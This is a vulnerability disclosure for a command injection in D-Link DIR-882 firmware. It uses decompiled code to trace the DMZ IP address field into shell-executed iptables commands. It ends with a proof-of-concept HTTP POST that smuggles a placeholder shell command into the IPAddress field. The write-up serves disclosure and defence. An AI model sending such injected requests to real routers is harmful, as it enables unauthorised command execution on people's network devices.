# Command Injection Vulnerability in `SetDMZSettings`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | D-Link DIR-882 Router                                        |
| Firmware Version     | DIR882A1_FW102B02                                            |
| Vulnerability Type   | **Command Injection**                                        |
| Vulnerable Component | `prog.cgi` (input handling) and `librcm.so` (execution of `iptables` rules) |
| Data Flow            | Cross-binary propagation via NVRAM variables (`nvram_safe_set` → `nvram_safe_get`) |
| Exploit Path         | Attacker-controlled input `SetDMZSettings/IPAddress` → stored in NVRAM (`dmz_ipaddr`) → retrieved by `librcm.so` (`v51`) → concatenated into `iptables` commands → executed by `twsystem` |
| Prerequisites        | No sanitization of DMZ IP address field; attacker can inject arbitrary shell commands through the web interface. |

2. Exploitation Path

```c
// prog.cgi
int __fastcall sub_4455BC(int a1)
{
  ...
  VarString = webGetVarString(a1, "/SetDMZSettings/Enabled");
  if ( !VarString )
    return WebsSetResponseResult(a1, 11);
  v3 = webGetVarString(a1, "/SetDMZSettings/IPAddress");
  if ( !v3 )
    return WebsSetResponseResult(a1, 11);
  if ( !strcmp(VarString, "true") )
    nvram_safe_set("dmz_enable", "1");
  else
    nvram_safe_set("dmz_enable", "0");
  nvram_safe_set("dmz_ipaddr", v3);
  ...
}

// librcm.so
int DMZ_run()
{
  ...
  v5 = nvram_safe_get("dmz_enable");
  if ( !strcmp(v5, "1") )
  {
    DMZ_chain_init();
    v51 = (const char *)nvram_safe_get("dmz_ipaddr");
    ...
    while ( 1 )
    {
      ... 
      if ( *v51 )
      {
        if ( *wan_ipaddr )
        {
          if ( *wan_ifname )
          {
            ...
            snprintf(
              v48,
              256,
              "iptables -t nat -A %s -d %s -j DNAT --to-destination %s 2>/dev/null",
              "DMZ_PREROUTING",
              wan_ipaddr,
              v51);
            twsystem(v48, 1);
            snprintf(
              v48,
              256,
              "iptables -t filter -A %s -i %s -d %s -j ACCEPT 2>/dev/null",
              "DMZ_FORWARD",
              wan_ifname,
              v51);
            twsystem(v48, 1);
            if ( v50 > 0 )
            {
              ...
              do
              {
                ...
                if ( *v30 )
                {
                  if ( strcmp(v30, "0.0.0.0") )
                  {
                    if ( sscanf(v30, "%d.%d.%d.%d", &v43, &v44, &v45, &v46) == 4 )
                    {
                      ...
                      if ( (_DWORD *)v36 == v55 )
                      {
                        snprintf(
                          v48,
                          256,
                          "iptables -t nat -A %s -d %s -s %s -j ACCEPT 2>/dev/null",
                          "DMZ_POSTROUTING",
                          v51,
                          v30);
                        twsystem(v48, 1);
                        snprintf(
                          v48,
                          256,
                          "iptables -t nat -A %s -s %d.%d.%d.%d/%s -d %s "
                          "-j SNAT --to-source %s 2>/dev/null",
                          "DMZ_POSTROUTING",
                          v39 & v43,
                          v40 & v44,
                          v41 & v45,
                          v42 & v46,
                          v31,
                          v51,
                          v54);
                        twsystem(v48, 1);
                      ...
}
```

3. **Vulnerable Binaries:**  `prog.cgi` and `librcm.so` (with cross-binary data flow).
4. 0-Day Command Injection Exploitation Path: 
   - In `prog.cgi`, line 8 executes `v3 = webGetVarString(a1, "/SetDMZSettings/IPAddress")`. The input is subsequently stored at line 15 via `nvram_safe_set("dmz_ipaddr", v3)`. In `librcm.so`, line 27 retrieves the stored value through `v51 = (const char *)nvram_safe_get("dmz_ipaddr")`. After string concatenation, the data is passed into line 46 `twsystem(v48, 1)`, leading to a command injection vulnerability.
   - In `prog.cgi`, line 8 executes `v3 = webGetVarString(a1, "/SetDMZSettings/IPAddress")`. The input is subsequently stored at line 15 via `nvram_safe_set("dmz_ipaddr", v3)`. In `librcm.so`, line 27 retrieves the stored value through `v51 = (const char *)nvram_safe_get("dmz_ipaddr")`. After string concatenation, the data is passed into line 54 `twsystem(v48, 1)`, leading to a command injection vulnerability.
   - In `prog.cgi`, line 8 executes `v3 = webGetVarString(a1, "/SetDMZSettings/IPAddress")`. The input is subsequently stored at line 15 via `nvram_safe_set("dmz_ipaddr", v3)`. In `librcm.so`, line 27 retrieves the stored value through `v51 = (const char *)nvram_safe_get("dmz_ipaddr")`. After string concatenation, the data is passed into line 77 `twsystem(v48, 1)`, leading to a command injection vulnerability.
   - In `prog.cgi`, line 8 executes `v3 = webGetVarString(a1, "/SetDMZSettings/IPAddress")`. The input is subsequently stored at line 15 via `nvram_safe_set("dmz_ipaddr", v3)`. In `librcm.so`, line 27 retrieves the stored value through `v51 = (const char *)nvram_safe_get("dmz_ipaddr")`. After string concatenation, the data is passed into line 91 `twsystem(v48, 1)`, leading to a command injection vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/prog.cgi HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
Connection: close

SetDMZSettings/Enabled=true
&SetDMZSettings/IPAddress=192.168.0.100;`INJECTED_COMMAND`
```